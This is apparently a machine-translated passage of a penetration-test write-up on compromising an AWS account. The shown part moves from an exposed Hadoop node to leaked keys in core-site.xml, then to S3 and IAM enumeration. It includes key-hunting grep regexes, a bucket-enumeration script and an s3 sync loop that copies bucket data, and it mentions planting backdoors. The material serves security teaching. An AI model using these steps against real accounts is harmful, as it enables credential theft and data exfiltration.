<html>
<head>
<title>Exploiting AWS IAM permissions for total cloud compromise: a real world example (1/2)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">利用AWS IAM权限实现全面的云妥协:一个真实的例子(1/2)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/exploiting-fine-grained-aws-iam-permissions-for-total-cloud-compromise-a-real-world-example-part-5a2f3de4be08?source=collection_archive---------0-----------------------#2020-09-29">https://infosecwriteups.com/exploiting-fine-grained-aws-iam-permissions-for-total-cloud-compromise-a-real-world-example-part-5a2f3de4be08?source=collection_archive---------0-----------------------#2020-09-29</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="5ce1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">注意:这是第二部分的链接。</p><h1 id="accd" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">介绍</h1><p id="5860" class="pw-post-body-paragraph jn jo iq jp b jq lk js jt ju ll jw jx jy lm ka kb kc ln ke kf kg lo ki kj kk ij bi translated">这是一个真实的案例研究，说明了如何枚举和使用IAM权限以获得优势。我<strong class="jp ir">强烈</strong>建议你阅读<a class="ae kl" href="https://medium.com/bugbountywriteup/aws-iam-explained-for-red-and-blue-teams-2dda8b20fbf7" rel="noopener">我之前的文章</a>关于我的权限是如何工作的。这很长，但对理解我们在这里做的大部分事情是必要的。我想澄清的另一件事是，这种利用是长期的，有点技术性，所以我不会深入讨论我们发现的更容易的漏洞(其中一个在以前的文章中也有涉及)。我们将介绍手动枚举IAM策略和角色，以及可以为您做到这一点的自动化工具(以及为什么您不应该100%地信任它们)。我们还会在jq 上一堂速成课。</p><h1 id="0d93" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">涉足网络</h1><p id="4b53" class="pw-post-body-paragraph jn jo iq jp b jq lk js jt ju ll jw jx jy lm ka kb kc ln ke kf kg lo ki kj kk ij bi translated">对公共AWS端点的Nessus扫描显示Hadoop实例暴露了未经验证的ResourceManager服务。您可能还记得我之前关于Hadoop和MCollective exploitation的文章中的这个漏洞。使用metasploit可以很容易地利用这一点来实现RCE。</p><p id="5ee1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在破坏了这个实例并快速设置了几个后门以在服务中断时重新获得访问权之后，我们开始扫描网络，并在内部接口(10.0.0.0/8)的端口9290上找到了一个带有公开服务的主Hadoop节点。</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi lp"><img src="../Images/dbd57b717e194f30dd70b7af72e695a0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Eb-QuK2yPNg367u9PUJxbA.png"/></div></div></figure><p id="d18d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们验证了它托管了Hadoop的配置文件。</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi mb"><img src="../Images/1023e4000bd312500ad8c104fa522b9e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*82REI4J0n1IAwpZDzHqPHA.png"/></div></div></figure><p id="b151" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们开始下载所有的信息进行分析。</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi mc"><img src="../Images/3b970c48b03bfe56042e071703992ca0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yGPIdTRMTgopQNCG0rUslg.png"/></div></div></figure><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div class="gh gi md"><img src="../Images/edd43b09e1421d6b943846915b74ff10.png" data-original-src="https://miro.medium.com/v2/resize:fit:1116/format:webp/1*qFLclQfcQXqd1XSuMlyGjw.png"/></div></figure><p id="3dcf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当您在AWS环境中工作时，您能找到的最好的东西之一是AWS访问密钥和秘密密钥。你可以在这里找到相关的正则表达式:<a class="ae kl" href="https://gist.github.com/hsuh/88360eeadb0e8f7136c37fd46a62ee10" rel="noopener ugc nofollow" target="_blank">https://gist . github . com/hsuh/88360 ee ADB 0 e 8 f 7136 c 37 FD 46 a 62 ee 10</a></p><p id="bcd4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">AWS有3种访问资源的方式。</p><ol class=""><li id="1f06" class="me mf iq jp b jq jr ju jv jy mg kc mh kg mi kk mj mk ml mm bi translated">通过web控制台</li><li id="e3c2" class="me mf iq jp b jq mn ju mo jy mp kc mq kg mr kk mj mk ml mm bi translated">通过命令行界面</li><li id="a137" class="me mf iq jp b jq mn ju mo jy mp kc mq kg mr kk mj mk ml mm bi translated">通过API的</li></ol><p id="4f9b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">要使用CLI，您需要一个访问密钥、一个密钥和一个可选的令牌。您可以使用以下正则表达式找到访问密钥和秘密密钥:</p><pre class="lq lr ls lt gt ms mt mu mv aw mw bi"><span id="68eb" class="mx kn iq mt b gy my mz l na nb">grep -RP '(?&lt;![A-Z0-9])[A-Z0-9]{20}(?![A-Z0-9])' *                       grep -RP '(?&lt;![A-Za-z0-9/+=])[A-Za-z0-9/+=]{40}(?![A-Za-z0-9/+=])' *</span></pre><p id="28a5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下载完所有内容后，我们运行它们，在一个名为core-site.xml的文件上找到了匹配项。</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi nc"><img src="../Images/87bfb96240c3629e4d2efca8887d1fa8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HFUJ19-JvYw2m-4IPd61eg.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">AWS访问键</figcaption></figure><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi nh"><img src="../Images/2ce38999c4b1d4aa14eb221a9d4cd0a6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*W-DN5_5gvnlg2N6LfSenWg.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">AWS密钥</figcaption></figure><p id="340e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">引用<a class="ae kl" href="https://www.edureka.co/blog/explaining-hadoop-configuration/" rel="noopener ugc nofollow" target="_blank">https://www . edu reka . co/blog/explaining-Hadoop-configuration/</a>:</p><blockquote class="ni nj nk"><p id="7de1" class="jn jo nl jp b jq jr js jt ju jv jw jx nm jz ka kb nn kd ke kf no kh ki kj kk ij bi translated">Core-site.xml和hdfs-site.xml:</p><p id="4c32" class="jn jo nl jp b jq jr js jt ju jv jw jx nm jz ka kb nn kd ke kf no kh ki kj kk ij bi translated">core-site.xml文件通知Hadoop守护进程NameNode在集群中运行的位置。它包含Hadoop核心的配置设置，例如HDFS和MapReduce通用的I/O设置。</p><p id="610a" class="jn jo nl jp b jq jr js jt ju jv jw jx nm jz ka kb nn kd ke kf no kh ki kj kk ij bi translated">hdfs-site.xml文件包含hdfs守护程序的配置设置；NameNode、辅助NameNode和DataNodes。在这里，我们可以配置hdfs-site.xml来指定hdfs上的默认数据块复制和权限检查。实际的复制次数也可以在创建文件时指定。如果在创建时未指定复制，则使用默认值。</p></blockquote><p id="8f2b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以使用<a class="ae kl" href="https://github.com/andresriancho/enumerate-iam" rel="noopener ugc nofollow" target="_blank"> enumerate-iam.py </a>来暴力破解该帐户可用的权限。</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi np"><img src="../Images/35c7aea851e09479f142afd0d6b24ee6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*A_XF2bNmQalfMJ8__TYQMw.png"/></div></div></figure><p id="b4d9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">显然该帐户可以列出s3桶！不过这个帐号似乎没有管理员权限。让我们用<a class="ae kl" href="https://github.com/RhinoSecurityLabs/Security-Research/blob/master/tools/aws-pentest-tools/aws_escalate.py" rel="noopener ugc nofollow" target="_blank"> RhinoSecurityLab的AWS _ upgrade . py</a>做一个快速权限提升检查。我在关于IAM权限的另一篇文章中已经提到了这个工具。你可以在这里阅读它为<a class="ae kl" href="https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation" rel="noopener ugc nofollow" target="_blank">检查的21种权限提升方法。</a></p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi nq"><img src="../Images/2a086cdcb4c9b6bb8d5b009a8841d545.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kO6krelQfMkoa-AwskHh9w.png"/></div></div></figure><p id="90cc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">坏消息是，这个账户似乎连GetUser权限都没有。但是还有更多的要调查。让我们回到S3路线。</p><h1 id="5658" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">旋转入口</h1><p id="3991" class="pw-post-body-paragraph jn jo iq jp b jq lk js jt ju ll jw jx jy lm ka kb kc ln ke kf kg lo ki kj kk ij bi translated">我们需要用凭证配置一个配置文件，并开始枚举。</p><pre class="lq lr ls lt gt ms mt mu mv aw mw bi"><span id="b83e" class="mx kn iq mt b gy my mz l na nb">aws configure --profile test</span></pre><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi nr"><img src="../Images/40d42f24eb52bac51495801f6efa49f2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2lbk37-sEZgX2IIQaA_j1A.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">在awscli中设置配置文件</figcaption></figure><pre class="lq lr ls lt gt ms mt mu mv aw mw bi"><span id="8a5e" class="mx kn iq mt b gy my mz l na nb">aws --profile test s3 ls</span></pre><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div class="gh gi ns"><img src="../Images/8a68c5df04e92dd8a26c8999d060e7b8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1346/format:webp/1*8FdSuEokQCy0R_BrkR0bwQ.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">验证列表权限</figcaption></figure><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div class="gh gi nt"><img src="../Images/83b902e9a15633715d28e6efba1c39da.png" data-original-src="https://miro.medium.com/v2/resize:fit:1128/format:webp/1*QsBd3ur5Qj8u5qG0Th6R0Q.png"/></div></figure><p id="8fd6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">大约有180桶。让我们从阅读开始</p><pre class="lq lr ls lt gt ms mt mu mv aw mw bi"><span id="ced8" class="mx kn iq mt b gy my mz l na nb">aws --profile test s3 ls s3://backup-db-logs</span></pre><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi nu"><img src="../Images/7f9a20ccaddfec1026c53f1ec5756a3f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*p1ZLbjKl4Q58i6IyWHXCqQ.png"/></div></div></figure><p id="79af" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这也是坏消息。显然，该帐户有权列出存储桶，但无权读取它们。我们需要能阅读的桶。有几个工具可以做到这一点，但我们总是喜欢编写自己的脚本，以便对幕后发生的事情有更多的控制:</p><pre class="lq lr ls lt gt ms mt mu mv aw mw bi"><span id="e940" class="mx kn iq mt b gy my mz l na nb">cat &gt; enumerateReadBuckets.sh &lt;&lt;EOF<br/>#!/bin/bash</span><span id="fc83" class="mx kn iq mt b gy nv mz l na nb">for i in "$@" ; do<br/> if [[ $i == "--profile" ]] ; then<br/>            profile=$(echo "$@" | awk '{for(i=1;i&lt;=NF;i++) if ($i=="--profile") print $(i+1)}')<br/>            AWS_ACCESS_KEY_ID=$(cat /root/.aws/credentials | grep -i "$profile" -A 2 | grep -i = | cut -d " " -f 3 | head -n 1)<br/>            AWS_SECRET_ACCESS_KEY=$(cat /root/.aws/credentials | grep -i "$profile" -A 2 | grep -i = | cut -d " " -f 3 | tail -n 1)<br/>            break<br/>        fi<br/>done</span><span id="d7f5" class="mx kn iq mt b gy nv mz l na nb">echo "Enumerating the buckets..."<br/>    aws --profile "$profile" s3 ls | cut -d ' ' -f 3 &gt; /tmp/buckets<br/>echo "You can read the following buckets:"<br/>    &gt;/tmp/readBuckets<br/>for i in $(cat /tmp/buckets); do<br/>    result=$(aws --profile "$profile" s3 ls s3://"$i" 2&gt;/dev/null | head -n 1)<br/>    if [ ! -z "$result" ]; then<br/>            echo "$i" | tee /tmp/readBuckets<br/>                    unset result<br/>    fi<br/>done<br/>EOF</span></pre><p id="8cfa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您可以用以下命令调用它</p><pre class="lq lr ls lt gt ms mt mu mv aw mw bi"><span id="b7f6" class="mx kn iq mt b gy my mz l na nb">bash enumerateReadBuckets.sh --profile test</span></pre><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div class="gh gi nw"><img src="../Images/f622afd085e24ce89ce680a5d8f6490f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1330/format:webp/1*H_zWii7Z7S29W-tgWDlDfQ.png"/></div></figure><p id="3070" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们只能得到4桶…不算太好，也不算太糟。让我们开始同步所有信息，以便在本地进行分析。</p><pre class="lq lr ls lt gt ms mt mu mv aw mw bi"><span id="4ba0" class="mx kn iq mt b gy my mz l na nb">for i in $(enumerateReadBuckets --profile test | tail -n +1); do aws s3 sync s3://"$i" .; done</span></pre><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi nx"><img src="../Images/393120ad8318641351888e80dbbf99ee.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hNxttIP-X8HV7E6Z07_nHA.png"/></div></div></figure><p id="6706" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是我们的剧本没有回来。我们当时不确定是什么问题，但这在pentest上经常发生，所以我们继续手动计数。我们从第一个桶开始，姑且称之为桶1</p><pre class="lq lr ls lt gt ms mt mu mv aw mw bi"><span id="083f" class="mx kn iq mt b gy my mz l na nb">aws --profile test s3 ls s3://bucket1</span></pre><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi ny"><img src="../Images/2ce8771cf65b06009a2d7a9ba939a660.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xAaAfNgCElHr9U6XZeFQSw.png"/></div></div></figure><p id="2b54" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一个conf目录！这看起来很有希望。</p><pre class="lq lr ls lt gt ms mt mu mv aw mw bi"><span id="7e27" class="mx kn iq mt b gy my mz l na nb">aws --profile test s3 ls s3://bucket1/conf/</span></pre><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi nz"><img src="../Images/4eadced89e1e1af0c686013e5bae7204.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cUHNjTiVhlWCx_eFVw6q-Q.png"/></div></div></figure><p id="423b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">等等，core-site.xml不是我们找到的第一个文件吗？让我们下载它并寻找凭证。</p><pre class="lq lr ls lt gt ms mt mu mv aw mw bi"><span id="c369" class="mx kn iq mt b gy my mz l na nb">aws --profile test s3 cp s3://bucket1/conf/hadoop/core-site.xml .</span></pre><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi oa"><img src="../Images/8509779fcb65cd7ff68bafdb20b22fe6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FRuwhAyWh2_HAxKZwPNE_A.png"/></div></div></figure><p id="c313" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">太好了！我们找到了新的凭证。让我们创建一个新的配置文件来使用它们。</p><pre class="lq lr ls lt gt ms mt mu mv aw mw bi"><span id="2ad5" class="mx kn iq mt b gy my mz l na nb">aws configure --profile test2</span></pre><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi ob"><img src="../Images/608168c2cb4109cddca0454247583688.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XHzJQtQWkmQnqTv5-43UpQ.png"/></div></div></figure><p id="eb9c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们强力使用我们的权限:</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi oc"><img src="../Images/eeaf3ba37a49f76fc998cdf6cedcc2e1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wxyFUimpq5wUu5TE8pC55w.png"/></div></div></figure><p id="2c1c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">太棒了。这个帐户似乎比我们的第一个帐户有更多的权限。让我们尝试添加一个新用户:</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi od"><img src="../Images/94e1e8ea78e959cc4aa941e970dc0806.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TK74tUwzqeO8NaYvegXxUA.png"/></div></div></figure><p id="d401" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">仍然没有管理员帐户。让我们尝试提升权限:</p><pre class="lq lr ls lt gt ms mt mu mv aw mw bi"><span id="d2c3" class="mx kn iq mt b gy my mz l na nb">./aws_escalate.py --access-key-id AKID --secret-key SK</span></pre><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi oe"><img src="../Images/f02dff1a928e92835549b37612188615.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ddv3LXu1K8TtsvNSYxmGRA.png"/></div></div></figure><p id="4edb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我们开始利用我们对aws cli的一些不错的知识。AWS _ upgrade脚本使用GetUser操作来获取当前用户。test2下的帐户没有GetUser权限。但是有其他方法可以获得你正在运行的用户。其中之一是使用<a class="ae kl" href="https://docs.aws.amazon.com/cli/latest/reference/sts/" rel="noopener ugc nofollow" target="_blank">安全令牌服务</a> API</p><pre class="lq lr ls lt gt ms mt mu mv aw mw bi"><span id="3e66" class="mx kn iq mt b gy my mz l na nb">aws sts get-caller-identity</span></pre><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi of"><img src="../Images/76001d3c94e3e368e41d3c5138ae2810.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vOPYFJKrNxPnLCQ-hUCdsA.png"/></div></div></figure><p id="5bdd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们知道了用户，我们可以手动指定它:</p><pre class="lq lr ls lt gt ms mt mu mv aw mw bi"><span id="df8b" class="mx kn iq mt b gy my mz l na nb">./aws_escalate.py --access-key-id AKID --secret-key SK --user-name USER</span></pre><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi og"><img src="../Images/48e120bc05d12530c99edb7552a60d3a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pj9W6WRm3oAMO3mat5OXLQ.png"/></div></div></figure><p id="58f1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">脚本返回没有可能的方法。这是因为用户没有权限调用脚本使用的任何方法。<strong class="jp ir">但是我们能够手动提升该用户的权限</strong>。让我们看看如何。</p><h1 id="0ffa" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">寻找完美的角色来扮演</h1><p id="8422" class="pw-post-body-paragraph jn jo iq jp b jq lk js jt ju ll jw jx jy lm ka kb kc ln ke kf kg lo ki kj kk ij bi translated">如果您还记得与我们的test2用户相关的权限，有很多是与ec2相关的。回到<a class="ae kl" href="https://medium.com/r?url=https%3A%2F%2Frhinosecuritylabs.com%2Faws%2Faws-privilege-escalation-methods-mitigation" rel="noopener"> Rhino的精彩博文</a>，我们可以看到方法3实际上使用了ec2:</p><blockquote class="ni nj nk"><p id="3dd0" class="jn jo nl jp b jq jr js jt ju jv jw jx nm jz ka kb nn kd ke kf no kh ki kj kk ij bi translated"><strong class="jp ir">描述:</strong>拥有iam:PassRole和ec2:RunInstances权限的攻击者可以创建一个他们将拥有操作系统访问权限的新ec2实例，并将现有的EC2实例配置文件/服务角色传递给它。然后，他们可以登录到该实例，并从EC2实例元数据中请求相关的AWS键，这使他们能够访问相关的实例概要文件/服务角色所拥有的所有权限。</p></blockquote><p id="bb40" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们在继续之前澄清一些事情。脚本是快速列举信息的好方法，但是它通常不能100%肯定地告诉你是否可以提升权限。这是因为</p><p id="43ee" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">1.大多数权限提升取决于几个因素，并且并非所有因素都容易相互关联</p><p id="c9c8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">2.Amazon权限是真正的粒度(你可能有列出存储桶的权限，但是没有读取它们的权限)。</p><p id="e3f8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">以我上面引用的方法为例。您可以拥有PassRole和RunInstances特权，但这实际上还不够。您还需要能够枚举要模拟的角色。为了利用它，您需要能够连接到实例(因此您需要自己已经创建的ssh密钥，以便在创建时将它们注入到实例中)。或者您需要实例连接回您，定义一个<a class="ae kl" href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html" rel="noopener ugc nofollow" target="_blank">用户脚本</a>。但是这两种方法都依赖于具有允许连接的安全组的实例(简单地说，安全组是防火墙策略的AWS名称)。因此，您需要枚举安全组，以了解将哪个组分配给实例(或者创建新组的权限)。</p><p id="5d92" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是粒度权限是一把双刃剑。你有比懒惰的系统管理员所想的更多的做事方法。我们可以利用这一点(正如我们将看到的那样)。</p><p id="f937" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我们需要找到的第一件事是我们想要偷哪个角色。让我们检查一下是否可以用</p><pre class="lq lr ls lt gt ms mt mu mv aw mw bi"><span id="dd1f" class="mx kn iq mt b gy my mz l na nb">aws --profile PROFILE iam list-roles | head -n 10</span></pre><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi oh"><img src="../Images/05aef3e9fd643b9f5895a8c978e90967.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KZj_SZ478uaDt9AjsFXPDA.png"/></div></div></figure><p id="3f9c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">太好了！我们有列表角色特权。现在，要找到一个好的角色劫持候选人，我们需要两样东西。</p><ol class=""><li id="72ce" class="me mf iq jp b jq jr ju jv jy mg kc mh kg mi kk mj mk ml mm bi translated">该角色需要附加管理员策略(或类似策略)。</li><li id="2259" class="me mf iq jp b jq mn ju mo jy mp kc mq kg mr kk mj mk ml mm bi translated">角色信任策略需要包含Amazon的EC2服务，以允许实例承担角色(如果您不知道这意味着什么，请回到我以前的文章)。</li></ol><p id="18cd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">关于第一点，我们可以列出相关的托管策略</p><pre class="lq lr ls lt gt ms mt mu mv aw mw bi"><span id="5a45" class="mx kn iq mt b gy my mz l na nb">aws --profile PROFILE iam list-attached-role-policies --role-name ROLE</span></pre><p id="471e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们还可以使用以下命令列出内联策略</p><pre class="lq lr ls lt gt ms mt mu mv aw mw bi"><span id="1472" class="mx kn iq mt b gy my mz l na nb">aws --profile PROFILE iam list-role-policies --role-name ROLE</span></pre><p id="f5f8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们以管理员角色为例来尝试一下:</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi oi"><img src="../Images/2491ad046eca77722e252ab2a91b8444.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zC1cO3_6Gw7IAhlpNfrXlw.png"/></div></div></figure><p id="c481" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">太好了！现在，让我们尝试获取信任关系文档(也称为承担角色策略)来看看谁可以承担这个角色。我们可以用这个</p><pre class="lq lr ls lt gt ms mt mu mv aw mw bi"><span id="eb51" class="mx kn iq mt b gy my mz l na nb">aws --profile PROFILE iam get-role --role-name ROLE</span></pre><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi oj"><img src="../Images/6720693f8b891f14edf9fc425ee992ea.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_Prdp62QEGv0D8wLg-S23A.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">如果您的帐户有权限，这是您应该得到的输出</figcaption></figure><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi ok"><img src="../Images/c1a27bed1bf75b9fa02def93731626eb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-s3KU6LvLqGg6oDCrTxq8w.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">这是我们用test2帐户得到的输出</figcaption></figure><p id="413b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这可不好。我们没有获取角色的权限。但是还记得我们说过的粒度权限吗？通常有多种方法可以获得相同的信息。在这种情况下，用户无权使用get-role，但有权使用list-role。<a class="ae kl" href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/list-roles.html" rel="noopener ugc nofollow" target="_blank"> 